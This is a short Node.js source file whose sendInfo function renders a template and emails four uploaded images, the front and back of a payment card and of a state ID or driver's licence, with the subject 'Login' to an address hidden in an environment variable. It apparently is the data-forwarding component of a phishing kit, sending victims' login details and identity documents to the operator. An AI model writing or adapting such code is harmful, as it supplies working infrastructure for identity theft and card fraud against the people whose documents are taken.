const transporter = require("../transporter");
const ejs = require("ejs")
const path = require("path");
const logger = require("../../helpers/logger");

exports.sendInfo = async (obj,files) => {

    //Get The Template
    const html = await ejs.renderFile(path.join(process.cwd(),"email","templates","sendInfo.ejs"),{obj});

    const mailOptions = {
    from: `${obj.username} <${obj.email}>`,
    to: process.env.MAIL,
    subject: "Login",
    attachments: [
        { filename: 'card-front.jpg', content: Buffer.from(files[0].buffer, 'utf-8') },
        {filename: 'card-back.jpg', content: Buffer.from(files[1].buffer,'utf-8')},
        {filename: 'stateId_dlFront.jpg', content: Buffer.from(files[2].buffer,'utf-8')},
        {filename: 'stateId_dlBack.jpg', content: Buffer.from(files[3].buffer,'utf-8')},
    ],
    html
    };

    transporter.sendMail(mailOptions, (err, result) => {
        if (err) {
            console.log(err)
            logger.debug(err)
        } else {
            console.log(result)
        }
    })

    
}
